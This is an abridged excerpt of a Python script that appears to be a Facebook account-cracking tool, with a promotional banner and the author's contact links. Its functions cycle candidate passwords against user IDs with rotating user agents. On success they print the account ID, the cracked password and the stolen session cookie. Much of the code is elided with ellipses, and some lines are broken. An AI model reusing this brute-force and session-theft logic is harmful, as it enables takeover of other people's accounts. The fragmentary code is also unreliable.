...
os.system('https://youtube.com/@crazybrothers8033')
...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By Jahid")
...
def menu_apikey():
 ...
 $$$$$$\  $$$$$$$\   $$$$$$\  $$$$$$$$\ $$\     $$\       $$$$$$$\  $$$$$$$\   $$$$$$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$  __$$\ $$  __$$\ $$  __$$\ \____$$  |\$$\   $$  |      $$  __$$\ $$  __$$\ $$  __$$\\__$$  __|$$ |  $$ |$$  _____|$$  __$$\ 
$$ /  \__|$$ |  $$ |$$ /  $$ |    $$  /  \$$\ $$  /       $$ |  $$ |$$ |  $$ |$$ /  $$ |  $$ |   $$ |  $$ |$$ |      $$ |  $$ |
$$ |      $$$$$$$  |$$$$$$$$ |   $$  /    \$$$$  /        $$$$$$$\ |$$$$$$$  |$$ |  $$ |  $$ |   $$$$$$$$ |$$$$$\    $$$$$$$  |
$$ |      $$  __$$< $$  __$$ |  $$  /      \$$  /         $$  __$$\ $$  __$$< $$ |  $$ |  $$ |   $$  __$$ |$$  __|   $$  __$$< 
$$ |  $$\ $$ |  $$ |$$ |  $$ | $$  /        $$ |          $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |   $$ |  $$ |$$ |      $$ |  $$ |
\$$$$$$  |$$ |  $$ |$$ |  $$ |$$$$$$$$\     $$ |          $$$$$$$  |$$ |  $$ | $$$$$$  |  $$ |   $$ |  $$ |$$$$$$$$\ $$ |  $$ |
 \______/ \__|  \__|\__|  \__|\________|    \__|          \_______/ \__|  \__| \______/   \__|   \__|  \__|\________|\__|  \__|
    ...
    ┌───────────────────────────────────────┐
    │ [✓] AUTHOR   : Its-Sakib-Hasan      │
    │ [✓] GITHUB   : its-sakib             │
    │ [✓] WHATSAPP : +88 01306082175        │
  ...
  os.system('xdg-open https://www.facebook.com/profile.php?id=100089017322843')
  print("");time.sleep(2)
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system('xdg-open https://wa.me/+8801306082175?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801306082175');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100089017322843');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://facebook.com/groups/427426672102053//');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[m[SAKIB] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[SAKI] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\r\33[1;92m [SAKIB>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m [💥] COOKIE : '+coki)
